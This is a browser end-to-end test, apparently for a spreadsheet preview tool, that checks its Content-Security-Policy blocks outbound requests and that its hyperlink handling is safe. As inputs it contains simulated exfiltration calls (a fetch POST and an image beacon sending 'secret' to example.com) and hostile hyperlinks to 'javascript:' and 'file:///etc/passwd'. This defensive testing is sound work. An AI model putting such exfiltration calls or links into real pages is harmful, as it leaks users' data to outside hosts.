// Nothing leaves the computer through the preview: the page has a Content-Security-Policy that lets it
// contact only this server; a whole session (open, edit, chart, paste a picture, save) makes no request
// elsewhere; Ctrl+click on a link opens only web / mail links, without a Referer, and goes to places in
// the workbook in place. Starts its own server (port 8884).   node tests/no_outbound.e2e.cjs
const { chromium } = require('playwright');
const { execFileSync } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

const ROOT = path.resolve(__dirname, '..');
const XL = path.join(ROOT, '.agents', 'skills', 'monoonom', 'scripts', 'xl.py');
let fails = 0;
const check = (name, ok, extra = '') => { console.log(`${ok ? 'PASS' : 'FAIL'} ${name}${extra && !ok ? ' — ' + extra : ''}`); if (!ok) fails++; };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const ws = fs.mkdtempSync(path.join(os.tmpdir(), 'wx-net-'));
const xl = (...a) => execFileSync('python3', [XL, ...a, '--root', ws], { encoding: 'utf8' });

execFileSync('python3', ['-c', `
from openpyxl import Workbook
wb = Workbook(); s = wb.active; s.title = "S"; s2 = wb.create_sheet("My Data")
links = [("https://example.com/report", None), (None, "'My Data'!B3"), ("javascript:alert(1)", None),
         ("file:///etc/passwd", None), ("mailto:someone@example.com", None)]
for i, (target, loc) in enumerate(links, 1):
    c = s.cell(i, 1, "link%d" % i)
    if target: c.hyperlink = target
    else:
        from openpyxl.worksheet.hyperlink import Hyperlink
        c.hyperlink = Hyperlink(ref=c.coordinate, location=loc)
for r in range(1, 6): s.cell(r, 3, r * 10)
wb.save(${JSON.stringify(path.join(ws, 'links.xlsx'))})
`]);

(async () => {
  xl('serve', '--port', '8884'); xl('open', 'links.xlsx');
  const url = xl('url', '--bare').trim();
  const origin = new URL(url).origin;
  const browser = require('./korean.cjs')(await chromium.launch());
  const errors = [], outside = [];
  try {
    const ctx = await browser.newContext({ viewport: { width: 1300, height: 800 } });
    // every request the page makes: anything not to this server is recorded and stopped
    await ctx.route('**/*', (route) => {
      const u = route.request().url();
      if (u.startsWith(origin) || u.startsWith('blob:') || u.startsWith('data:')) return route.continue();
      outside.push(u); return route.abort();
    });
    const p = await ctx.newPage();
    p.on('pageerror', (e) => errors.push(e.message));
    p.on('console', (m) => { if (m.type() === 'error') errors.push(m.text()); });
    const res = await p.goto(url);
    const csp = res.headers()['content-security-policy'] || '';
    check('the page has a Content-Security-Policy that allows only this server', /default-src 'self'/.test(csp) && /connect-src 'self'/.test(csp) && /form-action 'none'/.test(csp), csp);
    await p.waitForFunction(() => window.monoonom?.doc?.sync); await sleep(300);
    await p.evaluate(() => { window.__violations = []; document.addEventListener('securitypolicyviolation', (e) => window.__violations.push(e.violatedDirective + ' ' + e.blockedURI)); });

    // a normal session: edit, a chart, paste a picture, then the agent saves
    const a = () => p.evaluate(() => window.monoonom);
    await p.evaluate(() => { const a = window.monoonom; a.select(0, 3); a.focusGrid(); });
    await p.keyboard.type('=SUM(C1:C5)'); await p.keyboard.press('Enter');
    xl('chart', 'add', 'C1:C5', '--type', 'bar', '--sheet', 'S');
    await p.evaluate(async () => {
      const a = window.monoonom; a.select(8, 4); a.focusGrid();
      const c = document.createElement('canvas'); c.width = 40; c.height = 30; c.getContext('2d').fillRect(0, 0, 40, 30);
      const blob = await new Promise((r) => c.toBlob(r, 'image/png'));
      const dt = new DataTransfer(); dt.items.add(new File([blob], 'x.png', { type: 'image/png' }));
      document.dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true }));
    });
    await sleep(1200);
    xl('save', '--as', 'out.xlsx');
    const st = await p.evaluate(() => ({ d1: window.monoonom.doc.wb.value(window.monoonom.doc.wb.sheet, 0, 3), charts: window.monoonom.doc.wb.sheet.charts.length, images: window.monoonom.doc.wb.sheet.images.length, v: window.__violations }));
    check('a session (formula, chart, pasted picture, save) works under the policy', st.d1 === 150 && st.charts === 1 && st.images === 1 && fs.existsSync(path.join(ws, 'out.xlsx')), JSON.stringify(st));
    check('…with no policy violations and no requests outside this server', st.v.length === 0 && outside.length === 0, JSON.stringify({ v: st.v, outside }));

    // the browser itself refuses requests elsewhere (as a script injected into the page would try)
    const tried = await p.evaluate(async () => {
      let fetched = 'sent';
      try { await fetch('https://example.com/collect?d=secret', { method: 'POST', body: 'x', mode: 'no-cors' }); } catch { fetched = 'blocked'; }
      const img = new Image(); img.src = 'https://example.com/pixel.gif?d=secret';
      await new Promise((r) => setTimeout(r, 400));
      return { fetched, v: window.__violations };
    });
    check('fetch / image to another host are blocked by the browser (CSP), never sent',
      tried.fetched === 'blocked' && tried.v.some((x) => /connect-src/.test(x)) && tried.v.some((x) => /img-src/.test(x)) && outside.length === 0, JSON.stringify({ tried, outside }));

    // Ctrl+click on links
    await p.evaluate(() => { window.__opened = []; window.open = (...args) => { window.__opened.push(args); return null; }; });
    const ctrlClick = async (r, c) => {
      const pt = await p.evaluate(([r, c]) => { const a = window.monoonom; a.activateSheet(0); const g = a.grid, h = g.host.getBoundingClientRect(), rc = g.cellRect(r, c); return { x: h.left + rc.x + 8, y: h.top + rc.y + rc.h / 2 }; }, [r, c]);
      await p.keyboard.down('Control'); await p.mouse.click(pt.x, pt.y); await p.keyboard.up('Control'); await sleep(250);
    };
    await ctrlClick(0, 0);
    let o = await p.evaluate(() => window.__opened);
    check('a web link opens in a new tab with noopener and noreferrer', o.length === 1 && o[0][0] === 'https://example.com/report' && /noopener/.test(o[0][2]) && /noreferrer/.test(o[0][2]), JSON.stringify(o));
    await ctrlClick(1, 0);
    const at = await p.evaluate(() => { const a = window.monoonom, v = a.view(); return { sheet: a.doc.wb.sheet.name, r: v.active.r, c: v.active.c, opened: window.__opened.length }; });
    check("a place in the workbook ('My Data'!B3) is shown here, nothing opened", at.sheet === 'My Data' && at.r === 2 && at.c === 1 && at.opened === 1, JSON.stringify(at));
    await ctrlClick(2, 0); await ctrlClick(3, 0);
    o = await p.evaluate(() => ({ n: window.__opened.length, toast: [...document.querySelectorAll('.toast')].map((x) => x.textContent).join(' | ') }));
    check('javascript: and file: links are not opened; a Korean notice says why', o.n === 1 && /이 링크는 열지 않았습니다/.test(o.toast) && /javascript:alert/.test(o.toast), JSON.stringify(o));
    await ctrlClick(4, 0);
    o = await p.evaluate(() => window.__opened);
    check('a mail link opens', o.length === 2 && o[1][0] === 'mailto:someone@example.com', JSON.stringify(o));
    check('no page errors', errors.filter((e) => !/Content Security Policy|example\.com|ERR_FAILED/.test(e)).length === 0, errors.join('; '));
  } finally {
    await browser.close();
    try { xl('stop', '--force'); } catch { /* ignore */ }
    fs.rmSync(ws, { recursive: true, force: true });
  }
  console.log(fails ? `${fails} FAILED` : 'ALL PASSED');
  process.exit(fails ? 1 : 0);
})().catch((e) => { console.error(e); try { xl('stop', '--force'); } catch { /* ignore */ } process.exit(1); });
